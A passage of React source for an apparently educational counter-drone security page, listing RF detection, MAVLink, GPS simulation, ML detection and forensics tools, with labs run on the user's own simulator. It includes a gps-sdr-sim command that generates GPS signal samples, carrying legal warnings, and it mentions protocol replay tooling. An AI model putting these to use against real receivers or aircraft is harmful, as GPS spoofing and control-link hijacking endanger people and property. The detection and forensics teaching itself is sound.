                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        RF Detection & Analysis Tools
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`RF Detection Open Source Tools
════════════════════════════════════════════════════════════

GNU RADIO DRONE DETECTION:
┌─────────────────────────────────────────────────────────────┐
│ Purpose: SDR-based drone signal detection                   │
│                                                             │
│ Sample Flowgraph Architecture:                              │
│ ┌───────┐   ┌────────┐   ┌──────────┐   ┌─────────────┐    │
│ │ SDR   │──▶│ Filter │──▶│ FFT/PSD  │──▶│ Peak Detect │    │
│ │Source │   │ 2.4GHz │   │ Analysis │   │ + Classify  │    │
│ └───────┘   └────────┘   └──────────┘   └─────────────┘    │
│                                                             │
│ Detection approaches:                                       │
│ ├── Energy detection (signal presence)                      │
│ ├── Cyclostationary feature detection                       │
│ ├── Protocol-specific demodulation                          │
│ └── ML-based classification                                 │
└─────────────────────────────────────────────────────────────┘

# Basic RTL-SDR drone scanning:
rtl_power -f 2400M:2500M:1M -g 40 -i 1 -e 300 scan.csv
python3 heatmap.py scan.csv output.png

INSPECTRUM (Signal Analysis):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/miek/inspectrum                      │
│                                                             │
│ Features:                                                   │
│ ├── IQ file visualization                                   │
│ ├── Time-frequency analysis                                 │
│ ├── Symbol extraction                                       │
│ └── Cursor-based measurement                                │
│                                                             │
│ Usage: Analyze captured drone signals                       │
└─────────────────────────────────────────────────────────────┘

UNIVERSAL RADIO HACKER (URH):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/jopohl/urh                           │
│                                                             │
│ Capabilities:                                               │
│ ├── Automatic protocol identification                       │
│ ├── Demodulation (ASK, FSK, PSK, etc.)                      │
│ ├── Protocol reverse engineering                            │
│ ├── Signal generation and replay                            │
│ └── Built-in SDR support                                    │
│                                                             │
│ Excellent for: Reverse engineering drone control protocols  │
└─────────────────────────────────────────────────────────────┘

DRONEDETECTOR (Acoustic):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/audacity/audacity (for analysis)     │
│             + custom Python scripts                         │
│                                                             │
│ Approach:                                                   │
│ ├── Record audio with microphone array                      │
│ ├── FFT analysis for motor/propeller frequencies            │
│ ├── Cross-correlation for direction finding                 │
│ └── ML classification of drone types                        │
│                                                             │
│ # Python acoustic detection example:                        │
│ import librosa                                              │
│ import numpy as np                                          │
│                                                             │
│ # Load audio and compute spectrogram                        │
│ y, sr = librosa.load('recording.wav')                       │
│ D = librosa.stft(y)                                         │
│ # Look for drone motor harmonics (100-500 Hz)               │
│ motor_band = np.abs(D[100:500, :])                          │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        MAVLink & Drone Protocol Tools
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`MAVLink & Protocol Analysis Tools
════════════════════════════════════════════════════════════

PYMAVLINK:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/ArduPilot/pymavlink                  │
│ Install: pip install pymavlink                              │
│                                                             │
│ Capabilities:                                               │
│ ├── Connect to MAVLink vehicles                             │
│ ├── Parse/create MAVLink messages                           │
│ ├── Mission planning and upload                             │
│ ├── Parameter manipulation                                  │
│ └── Telemetry logging                                       │
└─────────────────────────────────────────────────────────────┘

# Example: Monitor all MAVLink messages
from pymavlink import mavutil

conn = mavutil.mavlink_connection('udp:127.0.0.1:14550')
conn.wait_heartbeat()
print(f"Connected to system {conn.target_system}")

while True:
    msg = conn.recv_match(blocking=True)
    print(f"{msg.get_type()}: {msg.to_dict()}")

MAVPROXY:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/ArduPilot/MAVProxy                   │
│ Install: pip install MAVProxy                               │
│                                                             │
│ Features:                                                   │
│ ├── Command-line ground station                             │
│ ├── Message logging and replay                              │
│ ├── Multiple vehicle management                             │
│ ├── Module system for extensions                            │
│ └── Excellent for C-UAS research                            │
└─────────────────────────────────────────────────────────────┘

# Start MAVProxy with logging:
mavproxy.py --master=udp:127.0.0.1:14550 --out=udp:127.0.0.1:14551

MAVSDK:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/mavlink/MAVSDK                       │
│ Languages: C++, Python, Swift, Java                         │
│                                                             │
│ Purpose: Modern API for drone applications                  │
│ Useful for: Building C-UAS research tools                   │
└─────────────────────────────────────────────────────────────┘

QGroundControl:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/mavlink/qgroundcontrol               │
│                                                             │
│ Features:                                                   │
│ ├── Full-featured ground control station                    │
│ ├── Mission planning                                        │
│ ├── Telemetry display                                       │
│ ├── Parameter configuration                                 │
│ └── Excellent for protocol understanding                    │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        GPS Research Tools
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="warning" sx={{ mb: 2, bgcolor: alpha(theme.warning, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          GPS spoofing transmission is illegal in most jurisdictions. These tools are for 
                          receive-only research, simulation, and controlled lab environments only.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`GPS Research Tools (Receive/Simulation Only)
════════════════════════════════════════════════════════════

GPS-SDR-SIM:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/osqzss/gps-sdr-sim                   │
│                                                             │
│ Purpose: Generate GPS baseband samples for simulation       │
│                                                             │
│ Features:                                                   │
│ ├── Arbitrary location/trajectory simulation                │
│ ├── Real ephemeris data support                             │
│ ├── Multiple output formats                                 │
│ └── Compatible with SDR playback                            │
│                                                             │
│ LEGAL USE CASES:                                            │
│ ├── RF-shielded lab testing                                 │
│ ├── GPS receiver development                                │
│ ├── Anti-spoofing research                                  │
│ └── Educational demonstrations                              │
└─────────────────────────────────────────────────────────────┘

# Generate GPS signal for location (SIMULATION ONLY):
./gps-sdr-sim -e brdc.nav -l 40.7128,-74.0060,100 -b 8 -o gpssim.bin

GNSS-SDR:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/gnss-sdr/gnss-sdr                    │
│                                                             │
│ Purpose: Open source GNSS software receiver                 │
│                                                             │
│ Capabilities:                                               │
│ ├── GPS L1 C/A, L2C, L5                                     │
│ ├── Galileo E1, E5a, E5b                                    │
│ ├── GLONASS L1 C/A, L2 C/A                                  │
│ ├── BeiDou B1I, B1C, B2a                                    │
│ ├── Spoofing detection research                             │
│ └── Multi-antenna processing                                │
│                                                             │
│ Research use: Understanding how GPS receivers work          │
│               and how they can be fooled                    │
└─────────────────────────────────────────────────────────────┘

GPREDICT:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/csete/gpredict                       │
│ Purpose: Satellite tracking                                 │
│                                                             │
│ Use for C-UAS:                                              │
│ ├── Understand GPS constellation geometry                   │
│ ├── Predict satellite visibility                            │
│ └── Analyze GPS signal availability                         │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Machine Learning Detection
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`ML-Based Drone Detection Projects
════════════════════════════════════════════════════════════

DRONERF DATASET:
┌─────────────────────────────────────────────────────────────┐
│ Paper: "Drone Classification from RF Fingerprints"         │
│ Dataset: RF recordings of various drones                    │
│                                                             │
│ Content:                                                    │
│ ├── Multiple drone models recorded                          │
│ ├── Various flight conditions                               │
│ ├── Background noise samples                                │
│ └── Labeled for supervised learning                         │
│                                                             │
│ Use: Train your own RF-based drone classifier               │
└─────────────────────────────────────────────────────────────┘

# Example: Simple RF drone classifier
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from scipy import signal

def extract_features(iq_samples, sample_rate):
    """Extract features from IQ samples for classification"""
    # Compute power spectral density
    freqs, psd = signal.welch(iq_samples, sample_rate)
    
    # Features
    features = [
        np.mean(psd),           # Average power
        np.max(psd),            # Peak power
        np.std(psd),            # Power variance
        freqs[np.argmax(psd)],  # Peak frequency
        bandwidth_estimate(psd, freqs),  # Signal bandwidth
    ]
    return features

# Train classifier on labeled drone/no-drone samples
clf = RandomForestClassifier(n_estimators=100)
clf.fit(X_train, y_train)

YOLO DRONE DETECTION:
┌─────────────────────────────────────────────────────────────┐
│ Multiple repositories available for visual drone detection │
│                                                             │
│ Approach:                                                   │
│ ├── YOLOv8 trained on drone imagery                         │
│ ├── Real-time detection from camera feed                    │
│ ├── Works with thermal/IR cameras                           │
│ └── Can track multiple drones simultaneously                │
│                                                             │
│ # Example using ultralytics:                                │
│ from ultralytics import YOLO                                │
│ model = YOLO('drone_detection.pt')                          │
│ results = model.predict(source='camera', show=True)         │
└─────────────────────────────────────────────────────────────┘

ACOUSTIC ML DETECTION:
┌─────────────────────────────────────────────────────────────┐
│ Approach: CNN on mel-spectrograms of audio                  │
│                                                             │
│ Architecture:                                               │
│ Audio → Mel-Spectrogram → CNN → Drone/Not-Drone             │
│                                                             │
│ Libraries: librosa, tensorflow/pytorch                      │
│                                                             │
│ # Mel-spectrogram extraction:                               │
│ import librosa                                              │
│ y, sr = librosa.load('audio.wav', sr=22050)                 │
│ mel_spec = librosa.feature.melspectrogram(y=y, sr=sr)       │
│ # Feed to CNN for classification                            │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Simulation & Testing Platforms
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Drone Simulation Platforms
════════════════════════════════════════════════════════════

ARDUPILOT SITL (Software In The Loop):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/ArduPilot/ardupilot                  │
│                                                             │
│ Purpose: Simulate ArduPilot flight controller               │
│                                                             │
│ Features:                                                   │
│ ├── Full flight controller simulation                       │
│ ├── MAVLink communication                                   │
│ ├── Multiple vehicle types                                  │
│ ├── Sensor simulation                                       │
│ └── Perfect for C-UAS research                              │
└─────────────────────────────────────────────────────────────┘

# Start SITL simulation:
cd ardupilot/ArduCopter
sim_vehicle.py -v ArduCopter --console --map

# Connect with your C-UAS research tools:
# UDP: 127.0.0.1:14550

PX4 GAZEBO SIMULATION:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/PX4/PX4-Autopilot                    │
│                                                             │
│ Features:                                                   │
│ ├── 3D physics simulation (Gazebo)                          │
│ ├── Realistic sensor models                                 │
│ ├── Multiple vehicle support                                │
│ ├── ROS integration                                         │
│ └── Computer vision testing                                 │
└─────────────────────────────────────────────────────────────┘

MICROSOFT AIRSIM:
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/microsoft/AirSim                     │
│                                                             │
│ Features:                                                   │
│ ├── Unreal Engine-based simulation                          │
│ ├── Photorealistic environments                             │
│ ├── Computer vision research                                │
│ ├── ML training data generation                             │
│ └── Python/C++ APIs                                         │
│                                                             │
│ C-UAS use: Train visual detection models                    │
└─────────────────────────────────────────────────────────────┘

WEBOTS:
┌─────────────────────────────────────────────────────────────┐
│ Website: cyberbotics.com (now open source)                  │
│                                                             │
│ Features:                                                   │
│ ├── Robot/drone simulation                                  │
│ ├── Physics engine                                          │
│ ├── Sensor simulation                                       │
│ └── Python/C++/ROS support                                  │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Drone Forensics Section */}
              <Box id="drone-forensics" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <SearchIcon /> Drone Forensics
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Drone forensics is the process of extracting and analyzing data from captured or recovered drones. 
                    This is increasingly important for law enforcement, military intelligence, and security incident 
                    response. A captured drone can reveal its flight history, the operator's location, and potentially 
                    identify the individuals behind malicious drone activity.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>What can be recovered:</strong> Modern drones store substantial amounts of data including 
                    flight logs with GPS coordinates, photos and videos from cameras, controller connection history, 
                    WiFi networks the drone has connected to, and sometimes even cached map data showing areas of 
                    interest to the operator. This data can be crucial for investigations and attribution.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Chain of custody:</strong> When conducting forensic analysis for legal purposes, maintaining 
                    proper chain of custody is essential. Document the condition of the drone when recovered, photograph 
                    everything before disassembly, create forensic images of storage before analysis, and document 
                    every step of the process. Poor handling can render evidence inadmissible in court.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        DJI Drone Forensics
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`DJI Drone Forensic Analysis
════════════════════════════════════════════════════════════

DATA STORAGE LOCATIONS:
┌─────────────────────────────────────────────────────────────┐
│ Internal Storage (drone):                                   │
│ ├── /DJI/dji.go.v5/FlightRecord/               (Flight logs)│
│ ├── /DCIM/                                     (Media files)│
│ ├── /DJI/LOG/                                  (System logs)│
│ └── Encrypted areas (varies by model)                       │
│                                                             │
│ SD Card:                                                    │
│ ├── /DCIM/                                     (Photos/video)│
│ ├── /MISC/                                     (Misc data)   │
│ └── /DJI/                                      (Flight data) │
│                                                             │
│ Controller:                                                 │
│ ├── /DJI/dji.go.v5/FlightRecord/               (Synced logs)│
│ ├── /DJI/CACHE/                                (Map cache)   │
│ └── App databases                              (User data)   │
│                                                             │
│ Mobile App (Android):                                       │
│ ├── /data/data/dji.go.v5/                      (App data)    │
│ ├── Shared preferences                         (Settings)    │
│ └── SQLite databases                           (Account info)│
└─────────────────────────────────────────────────────────────┘

FLIGHT LOG CONTENTS:
├── Timestamp (precise to milliseconds)
├── GPS coordinates (latitude, longitude, altitude)
├── Drone attitude (roll, pitch, yaw)
├── Motor speeds and power consumption
├── Battery status and voltage
├── RC signal strength
├── Video settings and capture events
├── Gimbal position
├── Home point location (operator location!)
└── Controller GPS (if available)

FORENSIC TOOLS:
┌─────────────────────────────────────────────────────────────┐
│ Commercial:                                                 │
│ ├── Cellebrite UFED (supports many drones)                  │
│ ├── MSAB XRY Drone                                          │
│ ├── Oxygen Forensic Detective                               │
│ └── Magnet AXIOM                                            │
│                                                             │
│ Open Source:                                                │
│ ├── DJI Flight Log Viewer (djiflightlogs.com)               │
│ ├── CsvView (DJI log parser)                                │
│ ├── Datcon (Python DJI DAT file parser)                     │
│ └── Autopsy with drone plugins                              │
└─────────────────────────────────────────────────────────────┘

# Parse DJI .DAT file (Python example):
# Using datcon: github.com/darksector/datcon
python datcon.py flyXXX.DAT -o output.csv

# Key columns to analyze:
# - GPS:Lat, GPS:Long, GPS:heightMSL
# - Controller:GPS:Lat, Controller:GPS:Long
# - OSD:flyTime, OSD:flightTime`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Open Source Drone Forensics
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Open Source / DIY Drone Forensics
════════════════════════════════════════════════════════════

ARDUPILOT/PX4 LOG ANALYSIS:
┌─────────────────────────────────────────────────────────────┐
│ Log format: .bin (ArduPilot) / .ulg (PX4)                   │
│                                                             │
│ Tools:                                                      │
│ ├── Mission Planner (ArduPilot log viewer)                  │
│ ├── UAV Log Viewer (web-based)                              │
│ ├── pyulog (PX4 Python library)                             │
│ └── FlightPlot (PX4 log analysis)                           │
│                                                             │
│ Data available:                                             │
│ ├── Complete flight path with timestamps                    │
│ ├── All sensor data (GPS, IMU, barometer)                   │
│ ├── Commands received and executed                          │
│ ├── System events and errors                                │
│ └── Parameter settings                                      │
└─────────────────────────────────────────────────────────────┘

# Parse ArduPilot .bin log with Python:
from pymavlink import mavutil

mlog = mavutil.mavlink_connection("00000001.BIN")
while True:
    m = mlog.recv_match()
    if m is None:
        break
    if m.get_type() == 'GPS':
        print(f"Time: {m.TimeMS}, Lat: {m.Lat}, Lng: {m.Lng}")

SD CARD FORENSICS:
┌─────────────────────────────────────────────────────────────┐
│ Steps:                                                      │
│ 1. Write-block the SD card (hardware blocker)               │
│ 2. Create forensic image: dd if=/dev/sdX of=image.dd        │
│ 3. Calculate hash: sha256sum image.dd                       │
│ 4. Mount read-only: mount -o ro,loop image.dd /mnt          │
│ 5. Analyze with forensic tools                              │
│                                                             │
│ Look for:                                                   │
│ ├── Deleted files (file carving)                            │
│ ├── EXIF data in images (GPS coordinates, timestamps)       │
│ ├── Video metadata                                          │
│ ├── Filesystem timestamps                                   │
│ └── Previous file names in directory entries                │
└─────────────────────────────────────────────────────────────┘

# Extract EXIF GPS data from images:
exiftool -gps* DCIM/DJI_0001.JPG

# File carving for deleted data:
photorec image.dd

MEMORY CHIP EXTRACTION:
┌─────────────────────────────────────────────────────────────┐
│ For damaged drones or encrypted storage:                    │
│                                                             │
│ 1. Identify memory chips (eMMC, NAND flash)                 │
│ 2. Desolder with hot air station                            │
│ 3. Read with chip reader (Easy JTAG, UFI Box)               │
│ 4. Create binary image                                      │
│ 5. Reconstruct filesystem if needed                         │
│                                                             │
│ Challenges:                                                 │
│ ├── Encryption on some models                               │
│ ├── Proprietary filesystems                                 │
│ ├── Physical damage to chips                                │
│ └── Wear leveling complicates recovery                      │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Network Forensics
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Drone Network Forensics
════════════════════════════════════════════════════════════

WIFI-BASED DRONES:
┌─────────────────────────────────────────────────────────────┐
│ Evidence sources:                                           │
│ ├── Connected network history (SSID, BSSID)                 │
│ ├── IP addresses assigned                                   │
│ ├── Network traffic captures                                │
│ └── Connection timestamps                                   │
│                                                             │
│ Capture with Wireshark:                                     │
│ 1. Put WiFi in monitor mode                                 │
│ 2. Capture traffic on drone channel                         │
│ 3. Filter for drone MAC address                             │
│ 4. Analyze control protocol                                 │
└─────────────────────────────────────────────────────────────┘

# Wireshark capture filter for drone traffic:
wlan.addr == <drone_mac_address>

# Useful Wireshark display filters:
ip.src == 192.168.10.1    # Tello drone
udp.port == 8889          # Tello command port
udp.port == 11111         # Tello video port

DJI ACCOUNT FORENSICS:
┌─────────────────────────────────────────────────────────────┐
│ DJI accounts linked to drones provide:                      │
│ ├── Registered email address                                │
│ ├── Phone number (if registered)                            │
│ ├── Cloud-synced flight logs                                │
│ ├── Registration country                                    │
│ └── Device binding history                                  │
│                                                             │
│ Access: Requires legal process to DJI                       │
│ (Law enforcement subpoena/warrant)                          │
└─────────────────────────────────────────────────────────────┘

REMOTE ID CORRELATION:
┌─────────────────────────────────────────────────────────────┐
│ Remote ID data captured during incident:                    │
│ ├── UAS Serial Number                                       │
│ ├── Operator Location (at time of flight)                   │
│ ├── Historical position data                                │
│ └── Session IDs (may link to account)                       │
│                                                             │
│ Cross-reference with:                                       │
│ ├── FAA drone registration database                         │
│ ├── DJI's Remote ID system                                  │
│ ├── Cell tower records (operator location)                  │
│ └── Surveillance footage                                    │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Forensic Reporting
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Drone Forensic Report Template
════════════════════════════════════════════════════════════

1. EXECUTIVE SUMMARY
   ├── Incident overview
   ├── Key findings
   └── Attribution (if possible)

2. EVIDENCE COLLECTION
   ├── Date/time of collection
   ├── Chain of custody documentation
   ├── Photos of physical evidence
   ├── Condition of drone at collection
   └── Serial numbers and identifiers

3. TECHNICAL ANALYSIS
   ├── Drone make/model/serial number
   ├── Firmware version
   ├── Storage analysis
   │   ├── Internal memory
   │   ├── SD card contents
   │   └── Deleted file recovery
   └── Flight log analysis

4. FLIGHT RECONSTRUCTION
   ├── Timeline of events
   ├── Flight path visualization (map)
   ├── Key waypoints and timestamps
   ├── Takeoff location (operator location)
   └── Mission objectives (inferred)

5. MEDIA ANALYSIS
   ├── Photos captured
   ├── Videos captured
   ├── EXIF/metadata analysis
   └── Targets of surveillance (if applicable)

6. ATTRIBUTION
   ├── Account information (if available)
   ├── Controller analysis
   ├── Network forensics
   └── Corroborating evidence

7. CONCLUSIONS
   ├── Summary of findings
   ├── Confidence level
   └── Recommendations

APPENDICES:
├── Raw flight log data
├── Forensic tool reports
├── Hash values for all evidence
└── Detailed methodology`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Defense Section */}
              <Box id="defense" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <ShieldIcon /> Drone Defense (For Drone Operators)
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Understanding attacks is only half the equation—equally important is knowing how to defend against 
                    them. Whether you're operating drones commercially, building drone systems, or advising organizations 
                    on drone security, these defensive strategies will help protect drone operations from various threats.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Defense in depth:</strong> No single security measure is foolproof. Effective drone security 
                    combines multiple layers: encrypted communications to prevent eavesdropping and hijacking, GPS 
                    redundancy to survive spoofing attempts, proper configuration to minimize attack surface, and 
                    operational procedures that assume some attacks may succeed. The goal is to make attacks difficult, 
                    detect them when they occur, and recover gracefully when they succeed.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Choosing secure platforms:</strong> Not all drones are created equal from a security perspective. 
                    Enterprise-grade drones from manufacturers like DJI include encryption, authentication, and hardened 
                    firmware. Open-source platforms offer transparency but require more expertise to secure properly. 
                    WiFi-controlled toy drones should be considered insecure by design. Understanding these differences 
                    helps you select appropriate platforms for different security requirements.
                  </Typography>

                  <Grid container spacing={2}>
                    {[
                      { title: "Encrypted Links", desc: "Use drones with AES-encrypted control links (DJI OcuSync)", icon: <SecurityIcon />, color: theme.success },
                      { title: "GPS Redundancy", desc: "Multi-constellation GNSS (GPS+GLONASS+Galileo)", icon: <GpsFixedIcon />, color: theme.info },
                      { title: "Firmware Updates", desc: "Keep firmware current to patch vulnerabilities", icon: <MemoryIcon />, color: theme.primary },
                      { title: "Avoid WiFi Drones", desc: "Choose drones with dedicated RF links over WiFi", icon: <WifiIcon />, color: theme.warning },
                      { title: "Signal Monitoring", desc: "Monitor for jamming/interference before flights", icon: <SensorsIcon />, color: theme.accent },
                      { title: "Return-to-Home", desc: "Configure safe RTH altitude and location", icon: <FlightIcon />, color: theme.secondary },
                    ].map((item, idx) => (
                      <Grid item xs={12} sm={6} key={idx}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%", borderLeft: `4px solid ${item.color}` }}>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                            <Box sx={{ color: item.color }}>{item.icon}</Box>
                            <Typography variant="subtitle2" sx={{ color: item.color, fontWeight: 600 }}>{item.title}</Typography>
                          </Box>
                          <Typography variant="body2" sx={{ color: theme.textMuted }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </Paper>
              </Box>

              {/* Labs Section */}
              <Box id="labs" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <ScienceIcon /> Hands-On Labs
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Theory only takes you so far—hands-on practice is essential for developing real drone security skills. 
                    These labs are designed to give you practical experience with drone detection, analysis, and security 
                    testing using legal, receive-only techniques and your own equipment.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Setting up your lab:</strong> You'll need a few key pieces of equipment: an SDR receiver 
                    (RTL-SDR works great for beginners), a computer running Linux or Windows with the necessary software 
                    installed, and ideally a drone of your own for testing. Start with simple exercises like identifying 
                    drone signals, then progress to more complex tasks like protocol analysis and vulnerability assessment.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Lab philosophy:</strong> These labs emphasize legal, ethical techniques. We focus on passive 
                    reception (listening to signals), simulation environments, and testing on your own equipment. The skills 
                    you develop—RF analysis, protocol reverse engineering, vulnerability assessment—are directly applicable 
                    to legitimate security work. Always remember that testing on systems you don't own requires explicit 
                    written authorization.
                  </Typography>

                  <Alert severity="info" sx={{ mb: 3, bgcolor: alpha(theme.info, 0.1), color: theme.text }}>
                    <Typography variant="body2">
                      These labs use receive-only techniques, simulation, or your own drones.
                      Never attack drones you don't own without explicit authorization.
                    </Typography>
                  </Alert>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                        <Chip label="Beginner" size="small" sx={{ bgcolor: alpha(theme.success, 0.2), color: theme.success }} />
                        <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                          Lab 1: RF Detection with RTL-SDR
                        </Typography>
                      </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`# Lab 1: Detecting Drone RF Signals
# Requirements: RTL-SDR, SDR#/GQRX, your own drone

# 1. Install RTL-SDR drivers
# Linux:
sudo apt install rtl-sdr

# 2. Scan 2.4 GHz ISM band
rtl_power -f 2400M:2500M:500k -g 40 -i 1 -e 300 drone_scan.csv

# 3. Visualize with Python
import pandas as pd
import matplotlib.pyplot as plt

data = pd.read_csv('drone_scan.csv', header=None)
# Plot waterfall...

# 4. Turn on your drone and observe:
# - New signals appearing in the band
# - Bandwidth of control signal
# - Hopping pattern (if FHSS)
# - Video transmission (if 5.8 GHz equipped)

# 5. Document findings:
# - Center frequency
# - Bandwidth
# - Signal characteristics
# - Compare with drone specs`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                        <Chip label="Intermediate" size="small" sx={{ bgcolor: alpha(theme.warning, 0.2), color: theme.warning }} />
                        <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                          Lab 2: MAVLink Protocol Analysis
                        </Typography>
                      </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`# Lab 2: Analyzing MAVLink Traffic
# Requirements: SITL simulator, Wireshark, pymavlink

# 1. Install ArduPilot SITL (Software In The Loop)
git clone https://github.com/ArduPilot/ardupilot.git
cd ardupilot
./Tools/environment_install/install-prereqs-ubuntu.sh
. ~/.profile

# 2. Run SITL simulation
cd ArduCopter
sim_vehicle.py -v ArduCopter --console --map

# 3. Connect with QGroundControl
# UDP: 127.0.0.1:14550

# 4. Capture traffic with Wireshark
# Filter: udp.port == 14550

# 5. Analyze MAVLink messages
from pymavlink import mavutil

mav = mavutil.mavlink_connection('udp:127.0.0.1:14550')
while True:
    msg = mav.recv_match(blocking=True)
    if msg:
        print(f"{msg.get_type()}: {msg.to_dict()}")

# 6. Try sending commands (to YOUR simulation)
mav.mav.command_long_send(
    mav.target_system, mav.target_component,
    mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
    0, 0, 0, 0, 0, 0, 0, 10  # 10m altitude
)`}
                      />
                    </AccordionDetails>
                  </Accordion>

